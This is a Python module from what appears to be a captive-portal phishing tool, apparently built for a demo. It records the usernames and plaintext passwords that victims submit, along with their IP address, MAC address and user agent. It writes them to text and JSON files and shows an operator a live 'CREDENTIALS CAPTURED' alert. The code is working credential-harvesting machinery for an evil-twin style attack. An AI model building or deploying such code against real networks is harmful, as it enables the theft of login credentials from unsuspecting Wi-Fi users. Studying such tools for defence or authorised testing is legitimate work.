"""Credential storage for the captive portal.

Every submission is persisted two ways under ``captured/``:

* ``credentials.txt``  — human-readable log (quick to eyeball during a demo), and
* ``credentials.json`` — structured records (easy to post-process).

Each capture is also pushed into the shared :data:`core.state.STATE`, which is what gives
the operator the live "CREDENTIALS CAPTURED" feedback the brief asks for.
"""

from __future__ import annotations

import json
import os
import threading
import time
from typing import List

from core.state import STATE, Credential

CAPTURE_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "captured"
)
TXT_PATH = os.path.join(CAPTURE_DIR, "credentials.txt")
JSON_PATH = os.path.join(CAPTURE_DIR, "credentials.json")


class CredentialStore:
    """Append-only, thread-safe credential persistence."""

    def __init__(self) -> None:
        self._lock = threading.Lock()
        os.makedirs(CAPTURE_DIR, exist_ok=True)

    def save(self, cred: Credential) -> None:
        # Record in shared state first (also logs + marks the stage done for the UI), so the
        # JSON rewrite below includes this newest credential.
        STATE.add_credential(cred)
        with self._lock:
            self._append_txt(cred)
            self._rewrite_json()

    def _append_txt(self, cred: Credential) -> None:
        ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(cred.timestamp))
        with open(TXT_PATH, "a", encoding="utf-8") as fh:
            fh.write(
                f"[{ts}] user='{cred.username}' pass='{cred.password}' "
                f"ip={cred.client_ip} mac={cred.client_mac} ua='{cred.user_agent}'\n"
            )

    def _rewrite_json(self) -> None:
        records = [
            {
                "timestamp": c.timestamp,
                "username": c.username,
                "password": c.password,
                "client_ip": c.client_ip,
                "client_mac": c.client_mac,
                "user_agent": c.user_agent,
            }
            for c in STATE.credentials
        ]
        with open(JSON_PATH, "w", encoding="utf-8") as fh:
            json.dump(records, fh, indent=2)

    @staticmethod
    def all() -> List[Credential]:
        return list(STATE.credentials)
